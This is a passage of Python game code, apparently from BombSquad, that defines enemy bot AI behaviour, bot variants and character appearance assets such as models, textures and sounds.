    def _getTargetPlayerPt(self):
        """ returns the default player pt we're targeting """
        bp = bs.Vector(*self.node.position)
        closestLen = None
        closestVel = None
        for pp, pv in self._playerPts:

            l = (pp-bp).length()
            # ignore player-points that are significantly below the bot
            # (keeps bots from following players off cliffs)
            if (closestLen is None or l < closestLen) and (pp[1] > bp[1] - 5.0):
                closestLen = l
                closestVel = pv
                closest = pp
        if closestLen is not None:
            return (bs.Vector(closest[0], closest[1], closest[2]),
                    bs.Vector(closestVel[0], closestVel[1], closestVel[2]))
        else:
            return None, None

    def _setPlayerPts(self, pts):
        """
        Provide the spaz-bot with the locations of players.
        """
        self._playerPts = pts

    def _updateAI(self):
        """
        Should be called periodically to update the spaz' AI
        """
        
        if self.updateCallback is not None:
            if self.updateCallback(self) == True:
                return # true means bot has been handled

        t = self.node.position
        ourPos = bs.Vector(t[0], 0, t[2])
        canAttack = True

        # if we're a flag-bearer, we're pretty simple-minded - just walk
        # towards the flag and try to pick it up
        if self.targetFlag is not None:

            if not self.targetFlag.node.exists():
                # our flag musta died :-C
                self.targetFlag = None
                return
            if self.node.holdNode.exists():
                try: holdingFlag = (self.node.holdNode.getNodeType() == 'flag')
                except Exception: holdingFlag = False
            else: holdingFlag = False
            # if we're holding the flag, just walk left
            if holdingFlag:
                # just walk left
                self.node.moveLeftRight = -1.0
                self.node.moveUpDown = 0.0
            # otherwise try to go pick it up
            else:
                targetPtRaw = bs.Vector(*self.targetFlag.node.position)
                targetVel = bs.Vector(0, 0, 0)
                diff = (targetPtRaw-ourPos)
                diff = bs.Vector(diff[0], 0, diff[2]) # dont care about y
                dist = diff.length()
                toTarget = diff.normal()

                # if we're holding some non-flag item, drop it
                if self.node.holdNode.exists():
                    self.node.pickUpPressed = True
                    self.node.pickUpPressed = False
                    return

                # if we're a runner, run only when not super-near the flag
                if self.run and dist > 3.0:
                    self._running = True
                    self.node.run = 1.0
                else:
                    self._running = False
                    self.node.run = 0.0

                self.node.moveLeftRight = toTarget.x()
                self.node.moveUpDown = -toTarget.z()
                if dist < 1.25:
                    self.node.pickUpPressed = True
                    self.node.pickUpPressed = False
            return
        # not a flag-bearer.. if we're holding anything but a bomb, drop it
        else:
            if self.node.holdNode.exists():
                try: holdingBomb = \
                   (self.node.holdNode.getNodeType() in ['bomb', 'prop'])
                except Exception: holdingBomb = False
                if not holdingBomb:
                    self.node.pickUpPressed = True
                    self.node.pickUpPressed = False
                    return
            
        targetPtRaw, targetVel = self._getTargetPlayerPt()

        if targetPtRaw is None:
            # use default target if we've got one
            if self.targetPointDefault is not None:
                targetPtRaw = self.targetPointDefault
                targetVel = bs.Vector(0, 0, 0)
                canAttack = False
            # with no target, we stop moving and drop whatever we're holding
            else:
                self.node.moveLeftRight = 0
                self.node.moveUpDown = 0
                if self.node.holdNode.exists():
                    self.node.pickUpPressed = True
                    self.node.pickUpPressed = False
                return

        # we dont want height to come into play
        targetPtRaw.data[1] = 0
        targetVel.data[1] = 0

        distRaw = (targetPtRaw-ourPos).length()
        # use a point out in front of them as real target
        # (more out in front the farther from us they are)
        targetPt = targetPtRaw + targetVel*distRaw*0.3*self._leadAmount

        diff = (targetPt-ourPos)
        dist = diff.length()
        toTarget = diff.normal()

        if self._mode == 'throw':
            # we can only throw if alive and well..
            if not self._dead and not self.node.knockout:

                timeTillThrow = self._throwReleaseTime-bs.getGameTime()

                if not self.node.holdNode.exists():
                    # if we havnt thrown yet, whip out the bomb
                    if not self._haveDroppedThrowBomb:
                        self.dropBomb()
                        self._haveDroppedThrowBomb = True
                    # otherwise our lack of held node means we successfully
                    # released our bomb.. lets retreat now
                    else:
                        self._mode = 'flee'

                # oh crap we're holding a bomb.. better throw it.
                elif timeTillThrow <= 0:
                    # jump and throw..
                    def _safePickup(node):
                        if node.exists():
                            self.node.pickUpPressed = True
                            self.node.pickUpPressed = False
                    if dist > 5.0:
                        self.node.jumpPressed = True
                        self.node.jumpPressed = False
                        # throws:
                        bs.gameTimer(100, bs.Call(_safePickup, self.node))
                    else:
                        # throws:
                        bs.gameTimer(1, bs.Call(_safePickup, self.node))

                if self.static:
                    if timeTillThrow < 300:
                        speed = 1.0
                    elif timeTillThrow < 700 and dist > 3.0:
                        speed = -1.0 # whiplash for long throws
                    else:
                        speed = 0.02
                else:
                    if timeTillThrow < 700:
                        # right before throw charge full speed towards target
                        speed = 1.0
                    else:
                        # earlier we can hold or move backward for a whiplash
                        speed = 0.0125
                self.node.moveLeftRight = toTarget.x() * speed
                self.node.moveUpDown = toTarget.z() * -1.0 * speed

        elif self._mode == 'charge':
            if random.random() < 0.3:
                self._chargeSpeed = random.uniform(self.chargeSpeedMin,
                                                   self.chargeSpeedMax)
                # if we're a runner we run during charges *except when near
                # an edge (otherwise we tend to fly off easily)
                if self.run and distRaw > self.runDistMin:
                    self._leadAmount = 0.3
                    self._running = True
                    self.node.run = 1.0
                else:
                    self._leadAmont = 0.01
                    self._running = False
                    self.node.run = 0.0

            self.node.moveLeftRight = toTarget.x() * self._chargeSpeed
            self.node.moveUpDown = toTarget.z() * -1.0*self._chargeSpeed

        elif self._mode == 'wait':
            # every now and then, aim towards our target..
            # other than that, just stand there
            if bs.getGameTime()%1234 < 100:
                self.node.moveLeftRight = toTarget.x() * (400.0/33000)
                self.node.moveUpDown = toTarget.z() * (-400.0/33000)
            else:
                self.node.moveLeftRight = 0
                self.node.moveUpDown = 0

        elif self._mode == 'flee':
            # even if we're a runner, only run till we get away from our
            # target (if we keep running we tend to run off edges)
            if self.run and dist < 3.0:
                self._running = True
                self.node.run = 1.0
            else:
                self._running = False
                self.node.run = 0.0
            self.node.moveLeftRight = toTarget.x() * -1.0
            self.node.moveUpDown = toTarget.z()

        # we might wanna switch states unless we're doing a throw
        # (in which case thats our sole concern)
        if self._mode != 'throw':

            # if we're currently charging, keep track of how far we are
            # from our target.. when this value increases it means our charge
            # is over (ran by them or something)
            if self._mode == 'charge':
                if (self._chargeClosingIn and dist < 3.0
                        and dist > self._lastChargeDist):
                    self._chargeClosingIn = False
                self._lastChargeDist = dist

            # if we have a clean shot, throw!
            if (dist >= self.throwDistMin and dist < self.throwDistMax
                and random.random() < self.throwiness and canAttack):
                self._mode = 'throw'
                self._leadAmount = ((0.4+random.random()*0.6) if distRaw > 4.0
                                    else (0.1+random.random()*0.4))
                self._haveDroppedThrowBomb = False
                self._throwReleaseTime = (bs.getGameTime()
                                          + (1.0/self.throwRate)
                                          *(800 + int(1300*random.random())))

            # if we're static, always charge (which for us means barely move)
            elif self.static:
                self._mode = 'wait'
                
            # if we're too close to charge (and arent in the middle of an
            # existing charge) run away
            elif dist < self.chargeDistMin and not self._chargeClosingIn:
                # ..unless we're near an edge, in which case we got no choice
                # but to charge..
                if self._map()._isPointNearEdge(ourPos, self._running):
                    if self._mode != 'charge':
                        self._mode = 'charge'
                        self._leadAmount = 0.2
                        self._chargeClosingIn = True
                        self._lastChargeDist = dist
                else:
                    self._mode = 'flee'

            # we're within charging distance, backed against an edge, or farther
            # than our max throw distance.. chaaarge!
            elif (dist < self.chargeDistMax
                  or dist > self.throwDistMax
                  or self._map()._isPointNearEdge(ourPos, self._running)):
                if self._mode != 'charge':
                    self._mode = 'charge'
                    self._leadAmount = 0.01
                    self._chargeClosingIn = True
                    self._lastChargeDist = dist

            # we're too close to throw but too far to charge - either run
            # away or just chill if we're near an edge
            elif dist < self.throwDistMin:
                # charge if either we're within charge range or
                # cant retreat to throw
                self._mode = 'flee'

            # do some awesome jumps if we're running
            if ((self._running
                 and dist > 1.2 and dist < 2.2
                 and bs.getGameTime()-self._lastJumpTime > 1000)
                or (self.bouncy
                    and bs.getGameTime()-self._lastJumpTime > 400
                    and random.random() < 0.5)):
                self._lastJumpTime = bs.getGameTime()
                self.node.jumpPressed = True
                self.node.jumpPressed = False
                
            # throw punches when real close
            if dist < (1.6 if self._running else 1.2) and canAttack:
                if random.random() < self.punchiness:
                    self.onPunchPress()
                    self.onPunchRelease()

    def __superHandleMessage(self, msg):
        super(SpazBot, self).handleMessage(msg)

    def onPunched(self, damage):
        """
        Method override; sends bs.SpazBotPunchedMessage to the current activity.
        """
        bs.getActivity().handleMessage(SpazBotPunchedMessage(self, damage))

    def onFinalize(self):
        Spaz.onFinalize(self)
        # we're being torn down; release
        # our callback(s) so there's no chance of them
        # keeping activities or other things alive..
        self.updateCallback = None

    def handleMessage(self, msg):
        self._handleMessageSanityCheck()

        # keep track of if we're being held and by who most recently
        if isinstance(msg, bs.PickedUpMessage):
            self.__superHandleMessage(msg) # augment standard behavior
            self.heldCount += 1
            pickedUpBy = msg.node.sourcePlayer
            if pickedUpBy is not None and pickedUpBy.exists():
                self.lastPlayerHeldBy = pickedUpBy

        elif isinstance(msg, bs.DroppedMessage):
            self.__superHandleMessage(msg) # augment standard behavior
            self.heldCount -= 1
            if self.heldCount < 0:
                print "ERROR: spaz heldCount < 0"
            # let's count someone dropping us as an attack..
            try:
                if msg.node.exists(): pickedUpBy = msg.node.sourcePlayer
                else: pickedUpBy = bs.Player(None) # empty player ref
            except Exception as e:
                print 'EXC on SpazBot DroppedMessage:', e
                pickedUpBy = bs.Player(None) # empty player ref

            if pickedUpBy.exists():
                self.lastPlayerAttackedBy = pickedUpBy
                self.lastAttackedTime = bs.getGameTime()
                self.lastAttackedType = ('pickedUp', 'default')
            
        elif isinstance(msg, bs.DieMessage):

            # report normal deaths for scoring purposes
            if not self._dead and not msg.immediate:

                # if this guy was being held at the time of death, the
                # holder is the killer
                if (self.heldCount > 0 and self.lastPlayerHeldBy is not None
                        and self.lastPlayerHeldBy.exists()):
                    killerPlayer = self.lastPlayerHeldBy
                else:
                    # otherwise if they were attacked by someone in the
                    # last few seconds that person's the killer..
                    # otherwise it was a suicide
                    if (self.lastPlayerAttackedBy is not None
                           and self.lastPlayerAttackedBy.exists()
                           and bs.getGameTime() - self.lastAttackedTime < 4000):
                        killerPlayer = self.lastPlayerAttackedBy
                    else:
                        killerPlayer = None
                activity = self._activity()

                if killerPlayer is not None and not killerPlayer.exists():
                    killerPlayer = None
                if activity is not None:
                    activity.handleMessage(
                        SpazBotDeathMessage(self, killerPlayer, msg.how))
            self.__superHandleMessage(msg) # augment standard behavior

        # keep track of the player who last hit us for point rewarding
        elif isinstance(msg, bs.HitMessage):
            if msg.sourcePlayer is not None and msg.sourcePlayer.exists():
                self.lastPlayerAttackedBy = msg.sourcePlayer
                self.lastAttackedTime = bs.getGameTime()
                self.lastAttackedType = (msg.hitType, msg.hitSubType)
            self.__superHandleMessage(msg)
        else:
            Spaz.handleMessage(self, msg)

            
class BomberBot(SpazBot):
    """
    category: Bot Classes
    
    A bot that throws regular bombs
    and occasionally punches.
    """
    character='Spaz'
    punchiness=0.3

    
class BomberBotLame(BomberBot):
    """
    category: Bot Classes
    
    A less aggressive yellow version of bs.BomberBot.
    """
    color=gLameBotColor
    highlight=gLameBotHighlight
    punchiness = 0.2
    throwRate = 0.7
    throwiness = 0.1
    chargeSpeedMin = 0.6
    chargeSpeedMax = 0.6

    
class BomberBotStaticLame(BomberBotLame):
    """
    category: Bot Classes
    
    A less aggressive yellow version of bs.BomberBot
    who generally stays in one place.
    """
    static = True
    throwDistMin = 0.0

    
class BomberBotStatic(BomberBot):
    """
    category: Bot Classes
    
    A version of bs.BomberBot
    who generally stays in one place.
    """
    static = True
    throwDistMin = 0.0


class BomberBotPro(BomberBot):
    """
    category: Bot Classes
    
    A more aggressive red version of bs.BomberBot.
    """
    pointsMult = 2
    color=gProBotColor
    highlight = gProBotHighlight
    defaultBombCount = 3
    defaultBoxingGloves = True
    punchiness = 0.7
    throwRate = 1.3
    run = True
    runDistMin = 6.0

    
class BomberBotProShielded(BomberBotPro):
    """
    category: Bot Classes
    
    A more aggressive red version of bs.BomberBot
    who starts with shields.
    """
    pointsMult = 3
    defaultShields = True

    
class BomberBotProStatic(BomberBotPro):
    """
    category: Bot Classes
    
    A more aggressive red version of bs.BomberBot
    who generally stays in one place.
    """
    static = True
    throwDistMin = 0.0

class BomberBotProStaticShielded(BomberBotProShielded):
    """
    category: Bot Classes
    
    A more aggressive red version of bs.BomberBot
    who starts with shields and
    who generally stays in one place.
    """
    static = True
    throwDistMin = 0.0

    
class ToughGuyBot(SpazBot):
    """
    category: Bot Classes
    
    A manly bot who walks and punches things.
    """
    character = 'Kronk'
    punchiness = 0.9
    chargeDistMax = 9999.0
    chargeSpeedMin = 1.0
    chargeSpeedMax = 1.0
    throwDistMin = 9999
    throwDistMax = 9999

    
class ToughGuyBotLame(ToughGuyBot):
    """
    category: Bot Classes
    
    A less aggressive yellow version of bs.ToughGuyBot.
    """
    color=gLameBotColor
    highlight=gLameBotHighlight
    punchiness = 0.3
    chargeSpeedMin = 0.6
    chargeSpeedMax = 0.6

    
class ToughGuyBotPro(ToughGuyBot):
    """
    category: Bot Classes
    
    A more aggressive red version of bs.ToughGuyBot.
    """
    color=gProBotColor
    highlight=gProBotHighlight
    run = True
    runDistMin = 4.0
    defaultBoxingGloves = True
    punchiness = 0.95
    pointsMult = 2

    
class ToughGuyBotProShielded(ToughGuyBotPro):
    """
    category: Bot Classes
    
    A more aggressive version of bs.ToughGuyBot
    who starts with shields.
    """
    defaultShields = True
    pointsMult = 3

    
class NinjaBot(SpazBot):
    """
    category: Bot Classes
    
    A speedy attacking melee bot.
    """

    character = 'Snake Shadow'
    punchiness = 1.0
    run = True
    chargeDistMin = 10.0
    chargeDistMax = 9999.0
    chargeSpeedMin = 1.0
    chargeSpeedMax = 1.0
    throwDistMin = 9999
    throwDistMax = 9999
    pointsMult = 2

    
class BunnyBot(SpazBot):
    """
    category: Bot Classes
    
    A speedy attacking melee bot.
    """

    color=(1, 1, 1)
    highlight=(1.0, 0.5, 0.5)
    character = 'Easter Bunny'
    punchiness = 1.0
    run = True
    bouncy = True
    defaultBoxingGloves = True
    chargeDistMin = 10.0
    chargeDistMax = 9999.0
    chargeSpeedMin = 1.0
    chargeSpeedMax = 1.0
    throwDistMin = 9999
    throwDistMax = 9999
    pointsMult = 2

    
class NinjaBotPro(NinjaBot):
    """
    category: Bot Classes
    
    A more aggressive red bs.NinjaBot.
    """
    color=gProBotColor
    highlight=gProBotHighlight
    defaultShields = True
    defaultBoxingGloves = True
    pointsMult = 3

    
class NinjaBotProShielded(NinjaBotPro):
    """
    category: Bot Classes
    
    A more aggressive red bs.NinjaBot
    who starts with shields.
    """
    defaultShields = True
    pointsMult = 4

    
class ChickBot(SpazBot):
    """
    category: Bot Classes
    
    A slow moving bot with impact bombs.
    """
    character = 'Zoe'
    punchiness = 0.75
    throwiness = 0.7
    chargeDistMax = 1.0
    chargeSpeedMin = 0.3
    chargeSpeedMax = 0.5
    throwDistMin = 3.5
    throwDistMax = 5.5
    defaultBombType = 'impact'
    pointsMult = 2

    
class ChickBotStatic(ChickBot):
    """
    category: Bot Classes
    
    A bs.ChickBot who generally stays in one place.
    """
    static = True
    throwDistMin = 0.0

    
class ChickBotPro(ChickBot):
    """
    category: Bot Classes
    
    A more aggressive red version of bs.ChickBot.
    """
    color=gProBotColor
    highlight=gProBotHighlight
    defaultBombCount = 3
    defaultBoxingGloves = True
    chargeSpeedMin = 1.0
    chargeSpeedMax = 1.0
    punchiness = 0.9
    throwRate = 1.3
    run = True
    runDistMin = 6.0
    pointsMult = 3

    
class ChickBotProShielded(ChickBotPro):
    """
    category: Bot Classes
    
    A more aggressive red version of bs.ChickBot
    who starts with shields.
    """
    defaultShields = True
    pointsMult = 4

    
class MelBot(SpazBot):
    """
    category: Bot Classes
    
    A crazy bot who runs and throws sticky bombs.
    """
    character = 'Mel'
    punchiness = 0.9
    throwiness = 1.0
    run = True
    chargeDistMin = 4.0
    chargeDistMax = 10.0
    chargeSpeedMin = 1.0
    chargeSpeedMax = 1.0
    throwDistMin = 0.0
    throwDistMax = 4.0
    throwRate = 2.0
    defaultBombType = 'sticky'
    defaultBombCount = 3
    pointsMult = 3

    
class MelBotStatic(MelBot):
    """
    category: Bot Classes
    
    A crazy bot who throws sticky-bombs but generally stays in one place.
    """
    static = True

    
class PirateBot(SpazBot):
    """
    category: Bot Classes
    
    A bot who runs and explodes in 5 seconds.
    """
    character = 'Jack Morgan'
    run = True
    chargeDistMin = 0.0
    chargeDistMax = 9999
    chargeSpeedMin = 1.0
    chargeSpeedMax = 1.0
    throwDistMin = 9999
    throwDistMax = 9999
    startCursed = True
    pointsMult = 4

    
class PirateBotNoTimeLimit(PirateBot):
    """
    category: Bot Classes
    
    A bot who runs but does not explode on his own.
    """
    curseTime = -1

    
class PirateBotShielded(PirateBot):
    """
    category: Bot Classes
    
    A bs.PirateBot who starts with shields.
    """
    defaultShields = True
    pointsMult = 5

    
class BotSet(object):
    """
    category: Bot Classes
    
    A container/controller for one or more bs.SpazBots.
    """
    def __init__(self):
        """
        Create a bot-set.
        """
        # we spread our bots out over a few lists so we can update
        # them in a staggered fashion
        self._botListCount = 5
        self._botAddList = 0
        self._botUpdateList = 0
        self._botLists = [[] for i in range(self._botListCount)]
        self._spawnSound = bs.getSound('spawn')
        self._spawningCount = 0
        self.startMoving()

    def __del__(self):
        self.clear()

    def spawnBot(self, botType, pos, spawnTime=3000, onSpawnCall=None):
        """
        Spawn a bot from this set.
        """
        bsUtils.Spawner(pt=pos, spawnTime=spawnTime,
                        sendSpawnMessage=False,
                        spawnCallback=bs.Call(self._spawnBot, botType,
                                              pos, onSpawnCall))
        self._spawningCount += 1

    def _spawnBot(self, botType, pos, onSpawnCall):
        spaz = botType()
        bs.playSound(self._spawnSound, position=pos)
        spaz.node.handleMessage("flash")
        spaz.node.isAreaOfInterest = 0
        spaz.handleMessage(bs.StandMessage(pos, random.uniform(0, 360)))
        self.addBot(spaz)
        self._spawningCount -= 1
        if onSpawnCall is not None: onSpawnCall(spaz)
        
    def haveLivingBots(self):
        """
        Returns whether any bots in the set are alive or spawning.
        """
        haveLiving = any((any((not a._dead for a in l))
                          for l in self._botLists))
        haveSpawning = True if self._spawningCount > 0 else False
        return (haveLiving or haveSpawning)


    def getLivingBots(self):
        """
        Returns the living bots in the set.
        """
        bots = []
        for l in self._botLists:
            for b in l:
                if not b._dead: bots.append(b)
        return bots

    def _update(self):

        # update one of our bot lists each time through..
        # first off, remove dead bots from the list
        # (we check exists() here instead of dead.. we want to keep them
        # around even if they're just a corpse)
        try:
            botList = self._botLists[self._botUpdateList] = \
                [b for b in self._botLists[self._botUpdateList] if b.exists()]
        except Exception:
            bs.printException("error updating bot list: "
                              +str(self._botLists[self._botUpdateList]))
        self._botUpdateList = (self._botUpdateList+1)%self._botListCount

        # update our list of player points for the bots to use
        playerPts = []
        for player in bs.getActivity().players:
            try:
                if player.isAlive():
                    playerPts.append((bs.Vector(*player.actor.node.position),
                                     bs.Vector(*player.actor.node.velocity)))
            except Exception:
                bs.printException('error on bot-set _update')

        for b in botList:
            b._setPlayerPts(playerPts)
            b._updateAI()

    def clear(self):
        """
        Immediately clear out any bots in the set.
        """
        # dont do this if the activity is shutting down or dead
        activity = bs.getActivity(exceptionOnNone=False)
        if activity is None or activity.isFinalized(): return
        
        for i in range(len(self._botLists)):
            for b in self._botLists[i]:
                b.handleMessage(bs.DieMessage(immediate=True))
            self._botLists[i] = []
        
    def celebrate(self, duration):
        """
        Tell all living bots in the set to celebrate momentarily
        while continuing onward with their evil bot activities.
        """
        for l in self._botLists:
            for b in l:
                if b.node.exists():
                    b.node.handleMessage('celebrate', duration)

    def startMoving(self):
        """
        Starts processing bot AI updates and let them start doing their thing.
        """
        self._botUpdateTimer = bs.Timer(50, bs.WeakCall(self._update),
                                        repeat=True)
                    
    def stopMoving(self):
        """
        Tell all bots to stop moving and stops
        updating their AI.
        Useful when players have won and you want the
        enemy bots to just stand and look bewildered.
        """
        self._botUpdateTimer = None
        for l in self._botLists:
            for b in l:
                if b.node.exists():
                    b.node.moveLeftRight = 0
                    b.node.moveUpDown = 0
        
    def finalCelebrate(self):
        """
        Tell all bots in the set to stop what they were doing
        and just jump around and celebrate.  Use this when
        the bots have won a game.
        """
        self._botUpdateTimer = None
        # at this point stop doing anything but jumping and celebrating
        for l in self._botLists:
            for b in l:
                if b.node.exists():
                    b.node.moveLeftRight = 0
                    b.node.moveUpDown = 0
                    bs.gameTimer(random.randrange(0, 500),
                                 bs.Call(b.node.handleMessage,
                                         'celebrate', 10000))
                    jumpDuration = random.randrange(400, 500)
                    j = random.randrange(0, 200)
                    for i in range(10):
                        b.node.jumpPressed = True
                        b.node.jumpPressed = False
                        j += jumpDuration
                    bs.gameTimer(random.randrange(0, 1000),
                                 bs.Call(b.node.handleMessage, 'attackSound'))
                    bs.gameTimer(random.randrange(1000, 2000),
                                 bs.Call(b.node.handleMessage, 'attackSound'))
                    bs.gameTimer(random.randrange(2000, 3000),
                                 bs.Call(b.node.handleMessage, 'attackSound'))

    def addBot(self, bot):
        """
        Add a bs.SpazBot instance to the set.
        """
        self._botLists[self._botAddList].append(bot)
        self._botAddList = (self._botAddList+1)%self._botListCount

# define our built-in characters...

###############  SPAZ   ##################
t = Appearance("Spaz")

t.colorTexture = "neoSpazColor"
t.colorMaskTexture = "neoSpazColorMask"

t.iconTexture = "neoSpazIcon"
t.iconMaskTexture = "neoSpazIconColorMask"

t.headModel = "neoSpazHead"
t.torsoModel = "neoSpazTorso"
t.pelvisModel = "neoSpazPelvis"
t.upperArmModel = "neoSpazUpperArm"
t.foreArmModel = "neoSpazForeArm"
t.handModel = "neoSpazHand"
t.upperLegModel = "neoSpazUpperLeg"
t.lowerLegModel = "neoSpazLowerLeg"
t.toesModel = "neoSpazToes"

t.jumpSounds=["spazJump01",
              "spazJump02",
              "spazJump03",
              "spazJump04"]
t.attackSounds=["spazAttack01",
                "spazAttack02",
                "spazAttack03",
                "spazAttack04"]
t.impactSounds=["spazImpact01",
                "spazImpact02",
                "spazImpact03",
                "spazImpact04"]
t.deathSounds=["spazDeath01"]
t.pickupSounds=["spazPickup01"]
t.fallSounds=["spazFall01"]

t.style = 'spaz'


###############  Zoe   ##################
t = Appearance("Zoe")

t.colorTexture = "zoeColor"
t.colorMaskTexture = "zoeColorMask"

t.defaultColor = (0.6, 0.6, 0.6)
t.defaultHighlight = (0, 1, 0)

t.iconTexture = "zoeIcon"
t.iconMaskTexture = "zoeIconColorMask"

t.headModel = "zoeHead"
t.torsoModel = "zoeTorso"
t.pelvisModel = "zoePelvis"
t.upperArmModel = "zoeUpperArm"
t.foreArmModel = "zoeForeArm"
t.handModel = "zoeHand"
t.upperLegModel = "zoeUpperLeg"
t.lowerLegModel = "zoeLowerLeg"
t.toesModel = "zoeToes"

t.jumpSounds=["zoeJump01",
              "zoeJump02",
              "zoeJump03"]
t.attackSounds=["zoeAttack01",
                "zoeAttack02",
                "zoeAttack03",
                "zoeAttack04"]
t.impactSounds=["zoeImpact01",
                "zoeImpact02",
                "zoeImpact03",
                "zoeImpact04"]
t.deathSounds=["zoeDeath01"]
t.pickupSounds=["zoePickup01"]
t.fallSounds=["zoeFall01"]

t.style = 'female'


###############  Ninja   ##################
t = Appearance("Snake Shadow")

t.colorTexture = "ninjaColor"
t.colorMaskTexture = "ninjaColorMask"

t.defaultColor = (1, 1, 1)
t.defaultHighlight = (0.55, 0.8, 0.55)

t.iconTexture = "ninjaIcon"
t.iconMaskTexture = "ninjaIconColorMask"

t.headModel = "ninjaHead"
t.torsoModel = "ninjaTorso"
t.pelvisModel = "ninjaPelvis"
t.upperArmModel = "ninjaUpperArm"
t.foreArmModel = "ninjaForeArm"
t.handModel = "ninjaHand"
t.upperLegModel = "ninjaUpperLeg"
t.lowerLegModel = "ninjaLowerLeg"
t.toesModel = "ninjaToes"

ninjaAttacks = ['ninjaAttack'+str(i+1)+'' for i in range(7)]
ninjaHits = ['ninjaHit'+str(i+1)+'' for i in range(8)]
ninjaJumps = ['ninjaAttack'+str(i+1)+'' for i in range(7)]

t.jumpSounds=ninjaJumps
t.attackSounds=ninjaAttacks
t.impactSounds=ninjaHits
t.deathSounds=["ninjaDeath1"]
t.pickupSounds=ninjaAttacks
t.fallSounds=["ninjaFall1"]

t.style = 'ninja'


###############  Kronk   ##################
t = Appearance("Kronk")

t.colorTexture = "kronk"
t.colorMaskTexture = "kronkColorMask"

t.defaultColor = (0.4, 0.5, 0.4)
t.defaultHighlight = (1, 0.5, 0.3)

t.iconTexture = "kronkIcon"
t.iconMaskTexture = "kronkIconColorMask"

t.headModel = "kronkHead"
t.torsoModel = "kronkTorso"
t.pelvisModel = "kronkPelvis"
t.upperArmModel = "kronkUpperArm"
t.foreArmModel = "kronkForeArm"
t.handModel = "kronkHand"
t.upperLegModel = "kronkUpperLeg"
t.lowerLegModel = "kronkLowerLeg"
t.toesModel = "kronkToes"

kronkSounds = ["kronk1",
              "kronk2",
              "kronk3",
              "kronk4",
              "kronk5",
              "kronk6",
              "kronk7",
              "kronk8",
              "kronk9",
              "kronk10"]
t.jumpSounds=kronkSounds
t.attackSounds=kronkSounds
t.impactSounds=kronkSounds
t.deathSounds=["kronkDeath"]
t.pickupSounds=kronkSounds
t.fallSounds=["kronkFall"]

t.style = 'kronk'


###############  MEL   ##################
t = Appearance("Mel")

t.colorTexture = "melColor"
t.colorMaskTexture = "melColorMask"

t.defaultColor = (1, 1, 1)
t.defaultHighlight = (0.1, 0.6, 0.1)

t.iconTexture = "melIcon"
t.iconMaskTexture = "melIconColorMask"

t.headModel =     "melHead"
t.torsoModel =    "melTorso"
t.pelvisModel = "kronkPelvis"
t.upperArmModel = "melUpperArm"
t.foreArmModel =  "melForeArm"
t.handModel =     "melHand"
t.upperLegModel = "melUpperLeg"
t.lowerLegModel = "melLowerLeg"
t.toesModel =     "melToes"

melSounds = ["mel01",
              "mel02",
              "mel03",
              "mel04",
              "mel05",
              "mel06",
              "mel07",
              "mel08",
              "mel09",
              "mel10"]

t.attackSounds = melSounds
t.jumpSounds = melSounds
t.impactSounds = melSounds
t.deathSounds=["melDeath01"]
t.pickupSounds = melSounds
t.fallSounds=["melFall01"]

t.style = 'mel'


###############  Jack Morgan   ##################

t = Appearance("Jack Morgan")

t.colorTexture = "jackColor"
t.colorMaskTexture = "jackColorMask"

t.defaultColor = (1, 0.2, 0.1)
t.defaultHighlight = (1, 1, 0)

t.iconTexture = "jackIcon"
t.iconMaskTexture = "jackIconColorMask"

t.headModel =     "jackHead"
t.torsoModel =    "jackTorso"
t.pelvisModel = "kronkPelvis"
t.upperArmModel = "jackUpperArm"
t.foreArmModel =  "jackForeArm"
t.handModel =     "jackHand"
t.upperLegModel = "jackUpperLeg"
t.lowerLegModel = "jackLowerLeg"
t.toesModel =     "jackToes"

hitSounds = ["jackHit01",
             "jackHit02",
             "jackHit03",
             "jackHit04",
             "jackHit05",
             "jackHit06",
             "jackHit07"]

sounds = ["jack01",
          "jack02",
          "jack03",
          "jack04",
          "jack05",
          "jack06"]

t.attackSounds = sounds
t.jumpSounds = sounds
t.impactSounds = hitSounds
t.deathSounds=["jackDeath01"]
t.pickupSounds = sounds
t.fallSounds=["jackFall01"]

t.style = 'pirate'


###############  SANTA   ##################

t = Appearance("Santa Claus")

t.colorTexture = "santaColor"
t.colorMaskTexture = "santaColorMask"

t.defaultColor = (1, 0, 0)
t.defaultHighlight = (1, 1, 1)

t.iconTexture = "santaIcon"
t.iconMaskTexture = "santaIconColorMask"

t.headModel =     "santaHead"
t.torsoModel =    "santaTorso"
t.pelvisModel = "kronkPelvis"
t.upperArmModel = "santaUpperArm"
t.foreArmModel =  "santaForeArm"
t.handModel =     "santaHand"
t.upperLegModel = "santaUpperLeg"
t.lowerLegModel = "santaLowerLeg"
t.toesModel =     "santaToes"

hitSounds = ['santaHit01', 'santaHit02', 'santaHit03', 'santaHit04']
sounds = ['santa01', 'santa02', 'santa03', 'santa04', 'santa05']

t.attackSounds = sounds
t.jumpSounds = sounds
t.impactSounds = hitSounds
t.deathSounds=["santaDeath"]
t.pickupSounds = sounds
t.fallSounds=["santaFall"]

t.style = 'santa'

###############  FROSTY   ##################

t = Appearance("Frosty")

t.colorTexture = "frostyColor"
t.colorMaskTexture = "frostyColorMask"

t.defaultColor = (0.5, 0.5, 1)
t.defaultHighlight = (1, 0.5, 0)

t.iconTexture = "frostyIcon"
t.iconMaskTexture = "frostyIconColorMask"

t.headModel =     "frostyHead"
t.torsoModel =    "frostyTorso"
t.pelvisModel = "frostyPelvis"
t.upperArmModel = "frostyUpperArm"
t.foreArmModel =  "frostyForeArm"
t.handModel =     "frostyHand"
t.upperLegModel = "frostyUpperLeg"
t.lowerLegModel = "frostyLowerLeg"
t.toesModel =     "frostyToes"

frostySounds = ['frosty01', 'frosty02', 'frosty03', 'frosty04', 'frosty05']
frostyHitSounds = ['frostyHit01', 'frostyHit02', 'frostyHit03']

t.attackSounds = frostySounds
t.jumpSounds = frostySounds
t.impactSounds = frostyHitSounds
t.deathSounds=["frostyDeath"]
t.pickupSounds = frostySounds
t.fallSounds=["frostyFall"]

t.style = 'frosty'

###############  BONES  ##################

t = Appearance("Bones")

t.colorTexture = "bonesColor"
t.colorMaskTexture = "bonesColorMask"

t.defaultColor = (0.6, 0.9, 1)
t.defaultHighlight = (0.6, 0.9, 1)

t.iconTexture = "bonesIcon"
t.iconMaskTexture = "bonesIconColorMask"

t.headModel =     "bonesHead"
t.torsoModel =    "bonesTorso"
t.pelvisModel =   "bonesPelvis"
t.upperArmModel = "bonesUpperArm"
t.foreArmModel =  "bonesForeArm"
t.handModel =     "bonesHand"
t.upperLegModel = "bonesUpperLeg"
t.lowerLegModel = "bonesLowerLeg"
t.toesModel =     "bonesToes"

bonesSounds =    ['bones1', 'bones2', 'bones3']
bonesHitSounds = ['bones1', 'bones2', 'bones3']

t.attackSounds = bonesSounds
